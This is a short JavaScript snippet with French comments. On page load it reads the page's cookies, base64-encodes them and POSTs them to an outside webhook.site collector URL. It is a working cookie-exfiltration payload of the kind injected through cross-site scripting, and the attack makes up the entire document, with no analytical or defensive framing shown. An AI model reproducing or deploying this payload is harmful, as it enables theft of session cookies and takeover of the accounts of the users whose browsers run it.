window.addEventListener('load', function() {
  const cookies = document.cookie;  // Récupérer les cookies de la page actuelle
  
  // Encode les cookies en Base64 pour s'assurer qu'ils sont envoyés correctement
  const encodedCookies = btoa(cookies);

  // Utiliser fetch pour envoyer les cookies au serveur via la méthode POST
  fetch("https://webhook.site/fd85a4b6-780a-42da-a0c2-76a549fb4810", {
    method: "POST",  // Utilisation de la méthode POST
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"  // Le type de contenu est important pour POST
    },
    body: "cookies=" + encodedCookies  // Envoyer les cookies encodés dans le corps de la requête
  })
  .then(response => response.text())  // Traitez la réponse si nécessaire
  .catch(error => console.error('Error:', error));  // Gérer les erreurs éventuelles
});
